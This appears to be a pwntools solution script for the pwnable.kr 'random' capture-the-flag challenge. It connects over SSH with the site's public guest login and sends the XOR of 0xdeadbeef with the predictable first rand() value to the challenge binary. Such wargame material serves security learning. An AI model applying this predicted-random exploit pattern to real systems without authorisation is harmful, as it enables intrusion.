from pwn import *


system_cat=0x804885c
passcode1=338150
passcode2=13371337

context(arch = 'amd64', os = 'linux')

sh = ssh(host='pwnable.kr', user='random', password='guest', port=2222)
#proc=sh.interactive()
proc = sh.process('/home/random/random')
#proc = process('./random-1pt')
#print proc.recv(1024)
z=0xdeadbeef
rand=0x6b8b4567
pl=str(z^rand)

print hex(z),"^",hex(rand),pl
proc.sendline(pl)
#f=open('x','w')
#f.write(pl)
#f.close()
print proc.recv(1024)
#proc.interactive()
#print proc.recvuntil(':(')
